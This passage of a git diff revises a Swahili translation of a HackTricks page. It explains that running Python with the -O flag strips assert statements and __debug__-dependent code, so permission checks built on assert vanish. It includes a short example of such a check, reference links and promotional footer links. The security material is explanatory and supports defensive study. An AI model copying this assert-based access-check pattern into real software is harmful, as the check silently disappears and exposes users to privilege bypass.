-Python inayotekelezwa na maboresho kwa paramu `-O` itaondoa taarifa za kuthibitisha na nambari yoyote inayotegemea thamani ya **debug**.\
-Hivyo, ukaguzi kama
+Python inayotekelezwa na maboresho kwa parameta `-O` itaondoa taarifa za kudai na nambari yoyote inayotegemea thamani ya **debug**.\
+Kwa hivyo, ukaguzi kama
 ```python
 def check_permission(super_user):
 try:
@@ -1031,18 +1045,22 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-***
+**Kikundi cha Usalama cha Kujitahidi**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJISAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
